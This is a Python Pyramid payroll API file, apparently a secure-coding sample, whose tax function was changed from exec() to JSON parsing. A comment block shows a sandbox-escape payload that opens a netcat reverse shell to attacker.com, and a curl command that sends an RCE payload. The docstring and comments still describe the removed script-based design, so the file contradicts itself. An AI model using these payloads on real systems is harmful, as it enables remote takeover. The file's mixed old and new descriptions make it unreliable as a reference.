import os
import sys
import json
import sqlite3
import logging
from datetime import datetime
from wsgiref.simple_server import make_server
from pyramid.config import Configurator
from pyramid.response import Response
from pyramid.request import Request

# Configure logging for the Global Payroll Processor API
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - GlobalPayroll - %(levelname)s - %(message)s'
)
logger = logging.getLogger("PyramidPayroll")

DB_FILE = "employee_directory.db"

def init_db():
    """Initializes the SQLite database for employee records."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE employees (
            emp_id TEXT PRIMARY KEY,
            name TEXT NOT NULL,
            department TEXT NOT NULL,
            base_salary REAL NOT NULL,
            region TEXT NOT NULL
        )
    ''')

    mock_data = [
        ('EMP-1001', 'Alice Smith', 'Engineering', 125000.0, 'US-CA'),
        ('EMP-1002', 'Bob Jones', 'Marketing', 95000.0, 'UK-LND'),
        ('EMP-1003', 'Charlie Brown', 'Sales', 110000.0, 'DE-BER')
    ]
    cursor.executemany('''
        INSERT INTO employees (emp_id, name, department, base_salary, region)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_data)

    conn.commit()
    conn.close()
    logger.info("Employee directory database initialized.")

def get_employees_by_region(region: str) -> list:
    """Retrieves employee records for a specific region."""
    employees = []
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        if region == 'ALL':
            cursor.execute("SELECT * FROM employees")
        else:
            cursor.execute("SELECT * FROM employees WHERE region = ?", (region,))
        
        for row in cursor.fetchall():
            employees.append(dict(row))
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error fetching employees: {e}")
    return employees

def generate_regional_payroll(employee_data: list, tax_rules_json: str) -> list:
    """
    SECURE: Prevents Code Injection (CWE-94) by replacing arbitrary code 
    execution (exec) with safe, structured JSON-based configuration.
    """
    import json
    
    logger.info("Applying secure structured regional tax logic...")
    
    try:
        # Secure: We remove the dangerous exec() function entirely.
        # Executing untrusted strings as Python code is a critical vulnerability.
        # Instead, we redesign the payroll tax mechanism to accept a structured 
        # JSON string containing exact tax rates and fixed deductions.
        # Note: The client must be updated to send a JSON configuration string 
        # (e.g., '{"tax_rate": 0.25, "fixed_deduction": 500.0}') rather than a raw Python script.
        
        tax_config = json.loads(tax_rules_json)
        
        if not isinstance(tax_config, dict):
            logger.warning("Tax rules must be a valid JSON object (dictionary).")
            return []
            
        # Safely extract and validate the expected numeric parameters
        tax_rate = float(tax_config.get("tax_rate", 0.0))
        fixed_deduction = float(tax_config.get("fixed_deduction", 0.0))
        
        # Enforce basic business logic bounds to prevent mathematical errors or abuse
        if not (0.0 <= tax_rate <= 1.0):
            logger.error("Tax rate must be between 0.0 and 1.0.")
            return []
            
        processed_payroll = []
        for emp in employee_data:
            base_salary = float(emp.get('base_salary', 0.0))
            
            # Apply the tax configuration safely using standard arithmetic
            tax_amount = base_salary * tax_rate
            net_pay = base_salary - tax_amount - fixed_deduction
            
            # Ensure net pay doesn't drop below zero
            emp['net_pay'] = max(0.0, net_pay)
            processed_payroll.append(emp)
            
        logger.info(f"Successfully processed secure payroll for {len(processed_payroll)} employees.")
        return processed_payroll
        
    except json.JSONDecodeError as e:
        logger.error(f"Failed to parse tax rules as JSON: {e}")
        return []
    except (ValueError, TypeError) as e:
        logger.error(f"Invalid data types in tax configuration: {e}")
        return []
    except Exception as e:
        logger.error(f"Unexpected error applying secure tax calculation: {e}")
        return []

def health_check(request: Request):
    """Standard health check endpoint."""
    return Response(
        json={"status": "Pyramid Payroll API is operational"},
        content_type='application/json'
    )

def process_payroll_endpoint(request: Request):
    """
    API endpoint to process payroll for a specific region.
    Expects JSON payload: {"region": "US-CA", "tax_script": "def calculate_net_pay(emp):\n    return emp['base_salary'] * 0.75"}
    """
    try:
        payload = request.json_body
    except Exception:
        return Response(json={"error": "Invalid JSON payload."}, status=400, content_type='application/json')
        
    region = payload.get("region", "ALL")
    tax_script = payload.get("tax_script")
    
    if not tax_script:
        return Response(
            json={"error": "Missing 'tax_script' parameter in payload."}, 
            status=400, 
            content_type='application/json'
        )
        
    employees = get_employees_by_region(region)
    if not employees:
        return Response(
            json={"message": f"No employees found for region {region}."},
            content_type='application/json'
        )
    
    # Pass the untrusted string directly to the vulnerable function
    payroll_results = generate_regional_payroll(employees, tax_script)
    
    return Response(
        json={
            "region": region,
            "processed_count": len(payroll_results),
            "data": payroll_results
        },
        content_type='application/json'
    )

if __name__ == '__main__':
    init_db()
    
    # Configure Pyramid WSGI application
    with Configurator() as config:
        config.add_route('health', '/api/health')
        config.add_view(health_check, route_name='health', request_method='GET')
        
        config.add_route('process_payroll', '/api/payroll/process')
        config.add_view(process_payroll_endpoint, route_name='process_payroll', request_method='POST')
        
        app = config.make_wsgi_app()
    
    # Example Malicious Trigger:
    # 1. Attacker sends a POST request with a script designed to break out 
    #    of the restricted namespace and execute OS commands:
    #
    #    {
    #      "region": "US-CA",
    #      "tax_script": "def calculate_net_pay(emp):\n    [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')\n    return emp.get('base_salary', 0) * 0.7"
    #    }
    #
    # 2. Attacker issues the request to the vulnerable endpoint:
    #    curl -X POST http://127.0.0.1:6543/api/payroll/process \
    #         -H "Content-Type: application/json" \
    #         -d '{"region": "ALL", "tax_script": "def calculate_net_pay(emp):\n    [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '"'"'catch_warnings'"'"'][0]()._module.__builtins__['"'"'__import__'"'"']('"'"'os'"'"').system('"'"'echo RCE_SUCCESS'"'"')\n    return emp.get('"'"'base_salary'"'"', 0) * 0.7"}'

    server = make_server('0.0.0.0', 6543, app)
    logger.info("Starting Pyramid Payroll API on http://0.0.0.0:6543")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down API...")
